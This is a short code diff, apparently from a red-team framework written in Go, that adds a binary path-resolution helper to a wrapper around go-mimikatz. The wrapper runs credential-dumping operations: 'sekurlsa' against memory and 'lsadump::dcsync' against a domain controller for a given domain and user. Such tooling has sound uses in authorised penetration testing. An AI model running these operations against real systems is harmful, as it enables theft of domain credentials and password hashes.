@@ -29,6 +29,13 @@ func DefaultGoMimikatzConfig() GoMimikatzConfig {
 	}
 }
 
+func resolveBinary(name string) string {
+	if resolved := utils.ResolveLocalPath(name); resolved != "" {
+		return resolved
+	}
+	return name
+}
+
 func (g goMimikatzTool) Sekurlsa(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
 	cfg := DefaultGoMimikatzConfig()
 	if len(req.Args) > 0 {
@@ -41,7 +48,7 @@ func (g goMimikatzTool) Sekurlsa(ctx context.Context, req ExecutionRequest) (*Ex
 	execCtx, cancel := context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
 	defer cancel()
 	args := []string{cfg.Command}
-	cr := utils.RunCommandCtx(execCtx, cfg.Binary, args)
+	cr := utils.RunCommandCtx(execCtx, resolveBinary(cfg.Binary), args)
 	if !cr.Success {
 		return cmdResultToExecResult(cr), &ToolError{Tool: "go-mimikatz", Op: "sekurlsa", ExitCode: cr.ExitCode, Err: fmt.Errorf("%s", cr.Stderr)}
 	}
@@ -54,7 +61,7 @@ func (g goMimikatzTool) SekurlsaDcsync(ctx context.Context, req ExecutionRequest
 	if domain == "" || user == "" {
 		return nil, &ToolError{Tool: "go-mimikatz", Op: "dcsync", Err: fmt.Errorf("DOMAIN and USER env required")}
 	}
-	cr := utils.RunCommandCtx(ctx, "go-mimikatz", []string{
+	cr := utils.RunCommandCtx(ctx, resolveBinary("go-mimikatz"), []string{
 		"lsadump::dcsync",
 		fmt.Sprintf("/domain:%s", domain),
 		fmt.Sprintf("/user:%s", user),
